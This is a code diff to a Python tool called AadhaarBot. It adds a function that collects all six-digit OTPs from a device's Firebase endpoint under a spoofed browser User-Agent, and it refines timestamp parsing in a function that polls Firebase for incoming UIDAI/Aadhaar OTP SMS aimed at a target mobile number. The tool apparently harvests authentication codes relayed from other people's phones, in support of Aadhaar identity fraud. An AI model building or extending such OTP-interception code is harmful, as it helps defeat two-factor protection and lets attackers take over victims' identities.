@@ -10,7 +10,9 @@ import re
 import requests
 import time
 from io import BytesIO
-from datetime import datetime
+from datetime import datetime, timezone, timedelta
+
+IST_TZ = timezone(timedelta(hours=5, minutes=30))
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlparse
 import urllib3
@@ -790,6 +792,35 @@ class AadhaarBot:
             logger.error(f"Error scanning firebase devices: {e}", exc_info=True)
             return False, str(e)
 
+    def get_existing_device_otps(self, firebase_url: str, device_id: str = None) -> list:
+        """Returns all 6-digit OTPs currently existing in the device's Firebase endpoint."""
+        otps = []
+        try:
+            base, endpoints = self.normalize_firebase_url(firebase_url, device_id=device_id)
+            session = requests.Session()
+            session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+            for ep in endpoints:
+                try:
+                    r = session.get(ep, timeout=5)
+                    if r.status_code == 200 and r.content:
+                        d = r.json()
+                        def extract_all_otps(obj):
+                            if isinstance(obj, dict):
+                                for v in obj.values():
+                                    extract_all_otps(v)
+                            elif isinstance(obj, list):
+                                for item in obj:
+                                    extract_all_otps(item)
+                            elif isinstance(obj, str):
+                                for match in re.findall(r'\b(\d{6})\b', obj):
+                                    otps.append(match)
+                        extract_all_otps(d)
+                except Exception:
+                    pass
+        except Exception as e:
+            logger.debug(f"Error fetching baseline otps: {e}")
+        return list(set(otps))
+
     def fetch_otp_from_firebase(self, firebase_url: str, min_timestamp: float = None, timeout: int = 75, poll_interval: int = 3, target_mobile: str = None, exclude_otps: list = None, device_id: str = None):
         """
         Polls a Firebase Realtime Database for incoming UIDAI / Aadhaar OTP SMS.
@@ -828,17 +859,17 @@ class AadhaarBot:
                                     break
 
                             ts_val = None
-                            for tsk in ('rawTs', 'timestamp', 'time', 'ts'):
+                            for tsk in ('id', 'rawTs', 'timestamp', 'time', 'ts'):
                                 if tsk in obj:
                                     v = obj[tsk]
                                     if isinstance(v, (int, float)) and v > 1000000000:
-                                        ts_val = v / 1000.0 if v > 100000000000 else v
+                                        ts_val = v / 1000.0 if v > 100000000000 else float(v)
                                         break
                             if ts_val is None and 'dateTime' in obj and isinstance(obj['dateTime'], str):
                                 dt_str = obj['dateTime'].strip()
                                 for fmt in ('%d-%m-%Y | %I:%M %p', '%d/%m/%Y | %I:%M %p', '%Y-%m-%d %H:%M:%S', '%d-%m-%Y %H:%M:%S', '%Y-%m-%d %H:%M'):
                                     try:
-                                        ts_val = datetime.strptime(dt_str, fmt).timestamp()
+                                        ts_val = datetime.strptime(dt_str, fmt).replace(tzinfo=IST_TZ).timestamp()
                                         break
                                     except Exception:
                                         pass
